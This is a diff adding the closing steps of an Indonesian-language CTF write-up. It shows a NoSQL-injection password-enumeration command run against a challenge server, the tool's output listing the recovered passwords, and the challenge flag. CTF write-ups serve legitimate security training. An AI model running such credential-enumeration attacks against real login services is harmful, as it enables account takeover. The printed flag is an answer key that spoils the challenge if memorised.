@@ -25,4 +25,15 @@ guest
 ```
 guest bukanlah username untuk medapatkan flagnya maka saya berasumsi bahwa flag terdapat pada user 'admin', mari kita cari passwordnya dengan perintah :
 ```shell
+python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep password -op login:login
+```
+setelah tool selesai melakukan tugasnya maka mendapati hasil
+```shell
+2 password(s) found:
+guest
+ForestyHC{reject_humanity_return_to_monke_5543d8}
+```
+wow ternyata password untuk user admin adalah flag yang kita cari cari
 
+## Flag
+**ForestyHC{reject_humanity_return_to_monke_5543d8}**
